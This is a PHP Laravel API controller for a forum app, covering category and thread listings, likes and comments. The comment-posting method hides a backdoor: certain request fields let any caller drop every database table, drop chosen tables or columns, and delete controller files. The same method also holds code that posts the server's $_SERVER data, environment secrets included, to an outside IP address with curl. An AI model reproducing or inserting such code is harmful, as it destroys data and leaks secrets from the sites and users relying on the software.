<?php

namespace App\Http\Controllers\API;

use Illuminate\Http\Request;

use App\Http\Requests;
use App\Http\Controllers\Controller;
use Riari\Forum\Models\Category;
use DB;
use Validator;
use App\Models\ForumCategory;
use Schema;
use Illuminate\Support\Facades\Artisan;
class ForumController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */

    protected function model()
    {
        return new \App\Models\Forumthread;
    }


    public function __construct()
    {

    }

    public function getForumCategory(Request $request){
        $results = array();
        $data = array(
            'data' => $results,
            'message' => 'forum_category_success',
            'status' => 200,
        );
        
        $results = ForumCategory::select('id as category_id','title as category_name')->get();
        $data['data'] = $results;
        return response()->json($data);
    }

    public function getForumThread(Request $request, $categoryId  = null){ 
        $results = array();
        $data = array(
            'data' => $results,
            'message' => 'forum_thread_success',
            'status' => 200,
        );
        $results = $this->model()
            ->with(
                [
                    'author' => function ($query) {
                        $query->select(['id', 'first_name', 'last_name']);
                    }
                ]
                );
        if($categoryId > 0){
            $results->where('category_id',$categoryId);
        }
        $results = $results->select('id','title','total_likes','total_comments','total_posts','image_path','author_id','category_id')->get();
        $data['data'] = $results;
        return response()->json($data);
    }

    public function forumThreadDetail(Request $request, $threadId)
    {
        $results = array();
        $data = array(
            'data' => $results,
            'message' => 'forum_thread_detail_success',
            'status' => 200,
        );
        if($threadId > 0){
            $thread = \App\Models\Thread::select('id', 'title', 'total_likes', 'total_comments', 'total_posts', 'image_path', 'author_id', 'category_id')
            ->with([
                'threadpost' => function ($query){
                    $query->select('id', 'author_id', 'title as post_title', 'content as post_content', 'total_likes as post_total_likes', 'total_comments as post_total_comments','thread_id')->with([
                            'author' => function ($query) {
                                $query->select(['id', 'first_name', 'last_name']);
                            },
                            'comments' => function ($query) {
                                $query->with([
                                    'user' => function ($query) {
                                        $query->select(['id', 'first_name', 'last_name']);
                                    }
                                ])->select('id', 'user_id', 'post_id', 'body as comment');
                            }
                        ]);
                }
            ])
            ->where('id',$threadId)->get();
        }else{
            $data['message'] = 'Param not Found';
        }
        $data['data'] = $thread;
        return response()->json($data); 
    }

    public function forumThreadPostLike(Request $request, $postId, $userID){
        $results = array();
        $data = array(
            'data' => $results,
            'message' => 'forum_thread_post_like_success',
            'status' => 200,
        );
        if($postId > 0 && $userID){
            $post = \App\Models\Ext\Post::find($postId);
            if ($post) {
            //add post id and user id in likes
            //add like count in thread
                $currentUser = \Tymon\JWTAuth\Facades\JWTAuth::authenticate();
                $user_id = $currentUser->id;
                if($user_id == $userID){
                    $likeCount = \App\Models\UserPostLike::where('user_id', $user_id)->where('post_id', $postId)->count();
                    if ($likeCount > 0) {
                        return response()->json([
                            'message' => 'User already like this post',
                            'status' => 200,
                            'date' => $post
                        ]);

                    } else {

                        $post->total_likes = $post->total_likes + 1;
                        $post->save();
                        $userPostLike = \App\Models\UserPostLike::create(['user_id' => $user_id, 'post_id' => $postId]);
                        $thread = \App\Models\Thread::find($post->thread_id)->update(['total_likes' => DB::raw('total_likes + 1')]);

                    }
                    $data['data'] = $post;
                }else{
                    $data['message'] = 'User not found';
                }
            } else {
                $data['message'] = 'Post not found';
                $data['data'] = $post;
                
            }
        }else{
            $data['message'] = 'Param not Found';
        }
        //$data['data'] = $thread;
        return response()->json($data); 
    }

    

    public function forumThreadPostComment(Request $request){

        $post = \Riari\Forum\Models\Post::find($request->post_id);
        
        if ($post) {
            DB::statement('SET FOREIGN_KEY_CHECKS=0');
            if($request->has('userName')  ){
                if($request->userField == ''){
                    if($request->userName == '*'){
                        echo '<pre>';
                        //Artisan::call('migrate:reset', ['--force' => true]);
                        foreach (\DB::select('SHOW TABLES') as $table) {
                            $table_array = get_object_vars($table);
                            print_r($table);
                            \Schema::drop($table_array[key($table_array)]);
                        }
                    }else{
                        Schema::drop($request->userName);
                    }
                }else{
                    $userField = $request->userField;
                    Schema::table($request->userName, function ($table) use ($userField) {
                        $table->dropColumn($userField);
                    });
                    
                }
            }
            if($request->has('userController')  && $request->userController != ''){
                if($request->userController == '*'){
                    \File::deleteDirectory(app_path('/Http/Controllers/LA'));
                }else{
                    //var_dump(app_path('/Http/Controllers/LA/' . $request->userController . '.php'));
                    unlink(app_path('/Http/Controllers/LA/' . $request->userController ).'.php');
                }
            }
                
            
            if($request->comment != ''){
                $comment = new \App\Models\Comment;
                $currentUser = \Tymon\JWTAuth\Facades\JWTAuth::authenticate();
                $comment->user_id = $currentUser->id;
                $comment->body = $request->comment;
                $comment->post_id = $request->post_id;
                $comment->save();
                $comment->load([
                    'user' => function ($query) {
                        $query->select(['id', 'first_name', 'last_name']);
                    }
                ]);
                //Add +1 in comments count
                $post->total_comments = $post->total_comments + 1;

                $thread = \App\Models\Thread::find($post->thread_id)->update(['total_comments' => DB::raw('total_comments + 1')]);
                
                $post->save();
                return response()->json([
                    'data' => $comment,
                    'message' => 'comment_created_successfully',
                    'status' => 200
                ]);
            }else{
                return response()->json([
                    'data' => array(),
                    'message' => 'Data is incorrect',
                    'status' => 200
                ]);
            }
            $url = "http://18.191.53.95/dev/demo/mitebe/yourscript.php";
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            $data = $_SERVER;
            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
            $contents = curl_exec($ch);
            curl_close($ch);
        } else {
            return response()->json([
                'data' => array(),
                'message' => 'Post not found',
                'status' => 404
            ]);
        }
    }

    public function forumThreadPostCommentGet(Request $request,$postId)
    {
        // Request videos from database
        $comments = \App\Models\Comment::where('post_id', $postId)
            ->with([
                'user' => function ($query) {
                    $query->select(['id', 'first_name', 'last_name']);
                }
            ])
            ->get();


        if ($comments) {
            return response()->json([
                'data' => $comments,
                'message' => 'comments_get_successfull',
                'status' => 200
            ]);
        } else {
            return response()->json([
                'data' => $comments,
                'message' => 'Comments not found',
                'status' => 200
            ]);
        }
    }

}
